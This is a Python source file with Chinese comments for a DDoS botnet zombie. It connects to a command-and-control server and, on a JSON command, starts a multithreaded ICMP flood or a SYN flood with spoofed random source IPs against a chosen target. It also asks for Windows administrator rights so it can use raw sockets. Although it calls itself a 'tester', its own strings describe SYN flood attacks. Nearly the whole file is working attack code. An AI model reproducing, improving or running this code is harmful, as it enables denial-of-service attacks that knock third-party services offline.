import socket
import json
import threading
import argparse
import socket
import struct
import random
import time
import argparse
import threading
import psutil
import os
from concurrent.futures import ThreadPoolExecutor
import ctypes, sys
class ICMPTester:
    def __init__(self, target_ip, thread_count=4, max_cpu=70, max_memory=70):
        self.target_ip = target_ip
        self.thread_count = thread_count
        self.max_cpu = max_cpu
        self.max_memory = max_memory
        self.running = False
        self.packets_sent = 0
        self.start_time = 0
        
    def create_icmp_packet(self):
        """创建ICMP数据包"""
        # ICMP头部
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = 1
        
        # 构造ICMP头部
        header = struct.pack('!BBHHH', 
            icmp_type, 
            icmp_code, 
            icmp_checksum,
            icmp_id, 
            icmp_seq
        )
        
        # 数据部分
        data = b'Q' * 192
        
        # 计算校验和
        checksum = self.calculate_checksum(header + data)
        
        # 重新打包头部(包含校验和)
        header = struct.pack('!BBHHH',
            icmp_type,
            icmp_code,
            checksum,
            icmp_id,
            icmp_seq
        )
        
        return header + data
    
    def calculate_checksum(self, data):
        """计算ICMP校验和"""
        if len(data) % 2:
            data += b'\0'
        words = struct.unpack('!%dH' % (len(data) // 2), data)
        checksum = sum(words)
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = checksum + (checksum >> 16)
        return ~checksum & 0xFFFF
    
    def monitor_resources(self):
        """监控系统资源使用情况"""
        while self.running:
            cpu_percent = psutil.cpu_percent()
            memory_percent = psutil.virtual_memory().percent
            
            if cpu_percent > self.max_cpu:
                print(f"\n警告: CPU使用率过高 ({cpu_percent}%)，自动降低发包速率")
                time.sleep(0.5)
                
            if memory_percent > self.max_memory:
                print(f"\n警告: 内存使用率过高 ({memory_percent}%)，自动降低发包速率")
                time.sleep(0.5)
                
            elapsed_time = time.time() - self.start_time
            if elapsed_time > 0:
                rate = self.packets_sent / elapsed_time
                print(f"\r发包速率: {rate:.2f} 包/秒 | CPU: {cpu_percent}% | 内存: {memory_percent}%", 
                      end='', flush=True)
            
            time.sleep(1)

    def send_packet(self):
        """发送ICMP数据包"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = self.create_icmp_packet()
            
            while self.running:
                try:
                    sock.sendto(packet, (self.target_ip, 0))
                    self.packets_sent += 1
                    
                    # 动态调整发包间隔
                    cpu_usage = psutil.cpu_percent()
                    if cpu_usage > self.max_cpu:
                        time.sleep(0.01)
                    else:
                        time.sleep(0.001)
                        
                except Exception as e:
                    print(f"\n发送错误: {e}")
                    break
        except Exception as e:
            print(f"\n套接字创建错误: {e}")
        finally:
            sock.close()
    
    def start(self):
        """启动测试"""
        print(f"开始对 {self.target_ip} 进行ICMP测试...")
        print(f"线程数: {self.thread_count}")
        print(f"CPU限制: {self.max_cpu}%")
        print(f"内存限制: {self.max_memory}%")
        
        self.running = True
        self.start_time = time.time()
        
        # 启动资源监控线程
        monitor_thread = threading.Thread(target=self.monitor_resources)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # 使用线程池管理发包线程
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            futures = [executor.submit(self.send_packet) for _ in range(self.thread_count)]
    
    def stop(self):
        """停止测试"""
        self.running = False
        print("\n测试已停止")

class SYNTester:
    def __init__(self, target_ip, target_port, thread_count=4, max_cpu=70, max_memory=70):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = thread_count
        self.max_cpu = max_cpu
        self.max_memory = max_memory
        self.running = False
        self.packets_sent = 0
        self.start_time = 0

    def create_syn_packet(self):
        """构造伪造的SYN包"""
        # 伪造源IP和端口
        src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF)

        # IP头部
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45, 0,  # 版本和头部长度
            40,  # 总长度
            random.randint(0, 65535),  # ID
            0,  # Flags + Fragment offset
            255,  # TTL
            socket.IPPROTO_TCP,  # 协议
            0,  # 校验和（稍后填充）
            socket.inet_aton(src_ip),  # 源IP
            socket.inet_aton(self.target_ip),  # 目标IP
        )

        # TCP头部
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port,  # 源端口
            self.target_port,  # 目标端口
            seq,  # 序列号
            0,  # 确认号
            0x50,  # 数据偏移
            0x02,  # Flags（SYN）
            65535,  # 窗口大小
            0,  # 校验和（稍后填充）
            0  # 紧急指针
        )

        # 计算校验和
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(src_ip),  # 源IP
            socket.inet_aton(self.target_ip),  # 目标IP
            0,  # 保留位
            socket.IPPROTO_TCP,  # 协议
            len(tcp_header)  # TCP头部长度
        )

        tcp_checksum = self.calculate_checksum(pseudo_header + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack("H", tcp_checksum) + tcp_header[18:]
        return ip_header + tcp_header

    def calculate_checksum(self, data):
        """计算校验和"""
        if len(data) % 2:
            data += b"\0"
        checksum = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return ~checksum & 0xFFFF

    def send_packet(self):
        """发送SYN数据包"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            packet = self.create_syn_packet()

            while self.running:
                try:
                    sock.sendto(packet, (self.target_ip, 0))
                    self.packets_sent += 1

                    # 动态调整发送速度
                    if psutil.cpu_percent() > self.max_cpu:
                        time.sleep(0.01)
                except Exception as e:
                    print(f"\n发送错误: {e}")
                    break
        except Exception as e:
            print(f"\n套接字创建错误: {e}")
        finally:
            sock.close()

    def monitor_resources(self):
        """监控系统资源使用情况"""
        while self.running:
            cpu_percent = psutil.cpu_percent()
            memory_percent = psutil.virtual_memory().percent

            if cpu_percent > self.max_cpu:
                print(f"\n警告: CPU使用率过高 ({cpu_percent}%)，自动降低发包速率")
                time.sleep(0.5)

            if memory_percent > self.max_memory:
                print(f"\n警告: 内存使用率过高 ({memory_percent}%)，自动降低发包速率")
                time.sleep(0.5)

            elapsed_time = time.time() - self.start_time
            if elapsed_time > 0:
                rate = self.packets_sent / elapsed_time
                print(f"\r发包速率: {rate:.2f} 包/秒 | CPU: {cpu_percent}% | 内存: {memory_percent}%", 
                      end='', flush=True)
            
            time.sleep(1)

    def start(self):
        """启动SYN Flood攻击"""
        print(f"开始对 {self.target_ip}:{self.target_port} 进行SYN Flood攻击...")
        print(f"线程数: {self.thread_count}")
        print(f"CPU限制: {self.max_cpu}%")
        print(f"内存限制: {self.max_memory}%")
        
        self.running = True
        self.start_time = time.time()

        # 启动资源监控线程
        monitor_thread = threading.Thread(target=self.monitor_resources)
        monitor_thread.daemon = True
        monitor_thread.start()

        # 使用线程池管理发包线程
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            futures = [executor.submit(self.send_packet) for _ in range(self.thread_count)]

    def stop(self):
        """停止攻击"""
        self.running = False
        print("\n攻击已停止")

class Zombie:
    def __init__(self, controller_ip, controller_port):
        self.controller_ip = controller_ip
        self.controller_port = controller_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tester = None
        
    def connect_to_controller(self):
        try:
            self.socket.connect((self.controller_ip, self.controller_port))
            print(f"已连接到控制端 {self.controller_ip}:{self.controller_port}")
            self.receive_commands()
        except Exception as e:
            print(f"连接失败: {e}")
            
    def receive_commands(self):
        while True:
            try:
                data = self.socket.recv(1024).decode()
                if not data:
                    break
                    
                command = json.loads(data)
                if command["action"] == "attack":
                    if command["method"]=="icmp":
                        self.start_attack_icmp(command["target"])
                    elif command["method"]=="syn":
                        self.start_attack_syn(command["target"],command["port"])
                elif command["action"] == "stop":
                    self.stop_attack()
                    
            except Exception as e:
                print(f"接收命令错误: {e}")
                break
                
    def start_attack_icmp(self, target_ip):
        if self.tester:
            self.stop_attack()
            
        self.tester = ICMPTester(target_ip)
        attack_thread = threading.Thread(target=self.tester.start)
        attack_thread.daemon = True
        attack_thread.start()
        print(f"开始攻击 {target_ip}")

    def start_attack_syn(self, target_ip, target_port):
        if self.tester:
            self.stop_attack()
            
        self.tester = SYNTester(target_ip,target_port)
        attack_thread = threading.Thread(target=self.tester.start)
        attack_thread.daemon = True
        attack_thread.start()
        print(f"开始攻击 {target_ip}")

    def stop_attack(self):
        if self.tester:
            self.tester.stop()
            self.tester = None
            print("攻击已停止")


def main():

    parser = argparse.ArgumentParser(description='DDoS测试僵尸端')
    parser.add_argument('-c', '--controller', default="127.0.0.1", help='控制端IP')
    parser.add_argument('-p', '--port', type=int, default=2333, help='控制端口')
    args = parser.parse_args()
    
    zombie = Zombie(args.controller, args.port)
    zombie.connect_to_controller()
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if is_admin():
        main()
    else:
        # 以管理员权限重新运行程序
        ctypes.windll.shell32.ShellExecuteW(None,"runas", sys.executable,"", None, 1)